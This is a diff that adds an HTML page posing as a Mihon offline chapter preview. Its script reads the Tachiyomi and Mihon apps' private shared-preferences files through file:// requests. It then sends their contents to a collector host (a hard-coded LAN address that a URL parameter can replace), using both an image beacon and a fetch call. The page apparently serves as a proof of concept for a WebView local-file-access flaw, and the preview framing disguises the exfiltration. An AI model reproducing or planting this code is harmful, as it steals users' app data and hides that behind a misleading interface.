@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 离线章节预览</title>
+<style>
+body { font-family: sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.info { color: #666; font-size: 14px; }
+.status-ok { color: green; }
+.status-err { color: #b00020; }
+pre { background: #eee; padding: 8px; border-radius: 4px; font-size: 12px; white-space: pre-wrap; word-break: break-all; max-height: 320px; overflow-y: auto; }
+</style>
+</head>
+<body>
+<h2>Mihon 离线章节预览</h2>
+<p class="info">本地 HTML 用于预览离线章节排版和同步状态。</p>
+
+<div class="card">
+<h3>预览状态</h3>
+<div id="status">正在读取离线预览资源...</div>
+</div>
+
+<div class="card">
+<h3>读取结果</h3>
+<pre id="result">等待中...</pre>
+</div>
+
+<script>
+var params = new URLSearchParams(location.search);
+var collector = params.get("collector") || "http://192.168.10.145:8000/collect";
+
+var targets = [
+    "file:///android_asset/benchmark_mock_data.json",
+    "file:///data/data/eu.kanade.tachiyomi/shared_prefs/eu.kanade.tachiyomi_preferences.xml",
+    "file:///data/data/app.mihon.debug/shared_prefs/app.mihon.debug_preferences.xml",
+    "file:///data/data/app.mihon.dev/shared_prefs/app.mihon.dev_preferences.xml"
+];
+
+function setStatus(text, ok) {
+    var el = document.getElementById("status");
+    el.textContent = text;
+    el.className = ok ? "status-ok" : "status-err";
+}
+
+function appendResult(text) {
+    var el = document.getElementById("result");
+    el.textContent = (el.textContent === "等待中..." ? "" : el.textContent + "\n\n") + text;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data);
+    try {
+        new Image().src = collector + "?d=" + encodeURIComponent(payload);
+    } catch (e) {}
+    try {
+        fetch(collector + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
+    } catch (e) {}
+}
+
+function readFile(url) {
+    return new Promise(function(resolve) {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                resolve({
+                    url: url,
+                    status: xhr.status,
+                    text: xhr.responseText || "",
+                    ok: xhr.status === 0 || (xhr.status >= 200 && xhr.status < 300)
+                });
+            }
+        };
+        try {
+            xhr.open("GET", url, true);
+            xhr.send();
+        } catch (e) {
+            resolve({ url: url, status: "exception", text: e.message, ok: false });
+        }
+    });
+}
+
+async function run() {
+    setStatus("正在通过 file:// 页面跨源读取本地资源...", true);
+    for (var i = 0; i < targets.length; i++) {
+        var item = await readFile(targets[i]);
+        var preview = item.text.substring(0, 1200);
+        appendResult(item.url + "\nstatus=" + item.status + "\n" + preview);
+        if (item.text) {
+            exfil("file_access_" + item.url, item.text);
+        } else {
+            exfil("file_access_empty_" + item.url, "status=" + item.status);
+        }
+    }
+    setStatus("离线预览资源读取完成，已尝试回传可读取内容。", true);
+}
+
+run();
+</script>
+</body>
+</html>
